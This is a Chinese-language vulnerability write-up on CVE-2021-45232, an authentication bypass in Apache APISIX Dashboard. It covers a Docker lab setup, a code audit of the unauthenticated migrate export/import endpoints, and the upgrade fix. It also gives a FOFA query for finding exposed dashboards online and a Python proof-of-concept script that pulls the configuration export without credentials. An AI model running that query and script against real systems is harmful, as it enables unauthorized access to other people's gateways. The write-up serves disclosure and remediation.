
# 0X00 漏洞信息
Apache APISIX是一个实时、动态、高性能的API网关。Apache APISIX Dashboard旨在让用户尽可能容易地通过前端界面来操作Apache APISIX。<br />		2021年12月29日，监测到一则Apache官方发布的CVE-2021-45232 Apache APISIX Dashboard未授权访问漏洞的信息在2.10.1之前的Apache APISIX Dashboard中，Manager API使用了两个框架，在框架gin的基础上引入了框架droplet。所有API和认证中间件都是基于框架 droplet开发的，但有些API直接使用了框架gin的接口，从而绕过身份验证，导致未授权访问。


# 0X01 漏洞概述
| 漏洞名称 | Apache APISIX Dashboard 身份验证绕过漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-45232 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2021.12.18 |
| 分数 | 9.8 |
| CVSS | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-45232](https://nvd.nist.gov/vuln/detail/CVE-2021-45232) |


# 0X02 影响范围
Apache APISIX Dashboard < 2.10.1


# 0X03 环境搭建
通过git拉取在docker搭建环境
```javascript
git clone https://github.com/apache/apisix-docker
cd ./apisix-docker/example
```
![image.png](./assets/1660197764782-8c283ab1-e71a-4739-9694-cf62063ecd3c.png)

注意这里需要把apisix-dashboard版本修改为2.7
![image.png](./assets/1660271651217-9d1b7295-e5a4-4fbc-8d1f-1616f684eba0.png)

下载并启动环境
```javascript
docker-compose up -d
```

浏览器访问，默认账户密码：admin/admin




# 0X04 代码审计
以2.9.0版本为例
```
https://github.com/apache/apisix-dashboard/tree/release/2.9.0
```

		apisix-dashboard-release-2.9.0\apisix-dashboard-release-2.9.0\api\internal\filter路径下authentication.go文件中定义了用户通过URL访问以/apisix开头的接口时，使用HTTP Header中的Authorization进行权限认证。还定义了两个例外/apisix/admin/tool/version和/apisix/admin/user/login不需要进行权限认证认证。<br />![image-20220107094313191.png](./assets/1659516130649-68424dc3-2140-40cb-8876-22ebf6ff5317.png)

在apisix-dashboard-release-2.9.0/api/internal/route.go中注册了一些handler，在正常情况下利用droplet对URL进行鉴权处理，与authentication.go中的handle对应。<br />![image-20220107094347429.png](./assets/1659516144374-d3e37773-2294-49e8-b7be-9ab7c912fbf6.png)

	在apisix-dashboard-release-2.9.0/api/internal/handler/migrate/migrate.go中发现有两个接口/apisix/admin/migrate/export和/apisix/admin/migrate/import没有经过droplet进行处理，存在认证绕过。<br />![image-20220107094406064.png](./assets/1659516159402-b00661f3-1653-493a-925d-972249f1002b.png)




# 0X05 漏洞复现
fofa语句<br />title="Apache APISIX Dashboard"<br />![image-20220107094525838.png](./assets/1659516193584-5601e99b-ef24-4a50-927b-332ef9d9d51b.png)

使用ip+端口+/apisix/admin/migrate/export 的形式，不一定每个Ip都有这个漏洞，多尝试几个。

![image-20220107094641967.png](./assets/1659516210511-95dfaa0c-73da-4df9-9328-75dd2a13d576.png)



# 0X05 POC
```javascript
import urllib.request
import ssl

url=input("输入测试地址\n>>>") + "/apisix/admin/migrate/export"
context = ssl._create_unverified_context()
header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "X-Forwarded-For": "127.0.0.1"
        }
try:
    request = urllib.request.Request(url=url, headers=header)
    response = urllib.request.urlopen(request, context=context, timeout=10)
    html = str(response.read())
    if "Routes" in html or "hosts" in html and response.status == 200:
        print(html)
        print("[" + url + "]" + "[===存在Apache APISIX Dashboard身份认证绕过漏洞===]")
    else:
        print("[" + url + "]" + "[不存在Apache APISIX Dashboard身份认证绕过漏洞]")
except Exception as e:
    print("[" + url + "]" + "[不存在漏洞]", format(e))
```


# 0X06 解决方案
目前此漏洞已经修复，建议受影响用户尽快升级更新至Apache APISIX Dashboard 2.10.1版本。<br />下载链接：[https://github.com/apache/apisix-dashboard/releases](https://github.com/apache/apisix-dashboard/releases)
缓解措施：更改默认用户名和密码，限制源IP访问 Apache APISIX Dashboard。
